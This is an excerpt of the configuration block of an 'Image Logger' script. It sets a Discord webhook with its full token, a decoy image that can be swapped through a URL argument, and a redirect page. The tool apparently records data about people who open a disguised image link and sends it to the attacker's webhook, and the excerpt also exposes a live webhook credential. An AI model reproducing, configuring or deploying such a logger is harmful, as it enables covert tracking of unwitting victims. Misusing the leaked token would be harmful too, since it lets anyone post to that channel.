...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1071767264094855248/iKgVfZS66YDp7V8R14mBavFPa33JsL57_AX9VqK9A7CcPQSmqwvZVkY6y5eHBxfIcPiW",
    "image": "https://media.discordapp.net/attachments/951510498770317342/1073247110604005406/VOID.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)

    # CUSTOMIZATION #
    "username": "Image Logger", # Se6t this to the name you want the webhook to have
    ...
    "redirect": {
        ...
        "page": "https://voidontop.com" # Link to the webpage to redirect to 
    },
